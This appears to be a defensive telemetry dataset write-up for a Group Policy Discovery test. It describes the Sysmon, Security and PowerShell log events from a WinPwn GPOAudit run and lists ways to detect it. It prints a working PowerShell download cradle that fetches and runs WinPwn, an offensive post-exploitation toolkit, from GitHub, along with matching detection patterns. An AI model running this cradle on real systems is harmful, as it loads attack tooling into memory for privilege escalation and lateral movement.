# T1615-3: Group Policy Discovery — WinPwn - GPOAudit

## Technique Context

T1615 (Group Policy Discovery) includes adversary use of offensive toolkits to systematically audit GPO security settings. WinPwn is a PowerShell-based post-exploitation framework that provides modular functions for common Windows enumeration and exploitation tasks. The `GPOAudit` function specifically targets Group Policy Objects to identify misconfigurations that could be abused for privilege escalation or lateral movement.

## What This Dataset Contains

This dataset captures a WinPwn `GPOAudit` invocation via an IEX download cradle from raw.githubusercontent.com, executed as NT AUTHORITY\SYSTEM on ACME-WS02 (Windows 11 Enterprise, acme.local domain member).

**Sysmon (48 events)** — A richer Sysmon footprint than most T1615 tests:
- EID 7 (image load) events showing PowerShell DLL loading (mscoree, system assemblies, Defender DLL)
- EID 17 (named pipe) for PSHost pipes across multiple PowerShell instances
- EID 1 (process create) events including:
  - `whoami.exe` tagged `technique_id=T1033`
  - A new `powershell.exe` process with full command line: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') GPOAudit -noninteractive -consoleoutput}` — tagged `technique_id=T1059.001`
- EID 3 (network connection): `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26010.5-0\MsMpEng.exe` outbound TCP, consistent with Defender cloud lookup
- EID 22 (DNS query): `raw.githubusercontent.com` resolved to `::ffff:185.x.x.x`
- EID 10 (process access) and EID 11 (file create) events for the PowerShell startup profile

**Security log (10 events)** — EID 4688/4689 process create/exit pairs and EID 4703 token adjustment events.

**PowerShell log (51 events)** — EID 4104 captures:
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPOAudit -noninteractive -consoleoutput
```
The outer wrapper block (`& { ... }`) is also logged. EID 4100 error entries and the standard test framework boilerplate stubs are present. The WinPwn script itself would generate additional script blocks if it executed fully, but only the invocation wrapper appears — suggesting Defender may have blocked the download or the script execution was limited.

## What This Dataset Does Not Contain (and Why)

- **WinPwn module execution output** — If WinPwn's GPOAudit function ran, it would generate extensive additional script blocks as the module loaded. Their absence suggests Defender blocked the download or AMSI blocked execution of the downloaded content.
- **Sysmon ProcessCreate for the outer powershell.exe test framework** — The outer PowerShell host process does not appear as EID 1 because it is not on the sysmon-modular include list; only the inner `powershell.exe` spawned with the WinPwn command line is captured.
- **LDAP enumeration traffic** — No domain controller queries appear, consistent with the script not completing its GPO enumeration phase.
- **GPO content or audit results** — The actual GPO settings that GPOAudit would identify are not captured in any event.

## Assessment

The test attempted to load WinPwn from a pinned GitHub commit hash and run its GPOAudit function. The most significant telemetry is the Sysmon EID 1 event with the full download cradle command line (pinned commit hash, WinPwn URL, and function name), plus the matching PowerShell script block. The DNS query to `raw.githubusercontent.com` from a SYSTEM process provides a network-layer indicator. This dataset represents a realistic attempted use of a well-known offensive toolkit, with telemetry reflecting the attempt even if the script did not fully execute.

## Detection Opportunities Present in This Data

- **Sysmon EID 1 / PowerShell EID 4104**: The WinPwn GitHub URL (`S3cur3Th1sSh1t/WinPwn`) is a known offensive repository; its presence in either process command lines or script blocks is a high-confidence indicator.
- **Sysmon EID 1**: `powershell.exe` launched with `-exec bypass` or an inline IEX download cradle spawning from another PowerShell host (SYSTEM context) is anomalous.
- **Sysmon EID 22 / EID 3**: `raw.githubusercontent.com` DNS resolution followed by outbound HTTPS from a SYSTEM PowerShell process is a strong network-level indicator for download-cradle attacks.
- **PowerShell EID 4104**: The combination of `iex`, `net.webclient`, `downloadstring`, and a GitHub raw URL in a single script block is a highly reliable detection pattern for in-memory PowerShell attacks.
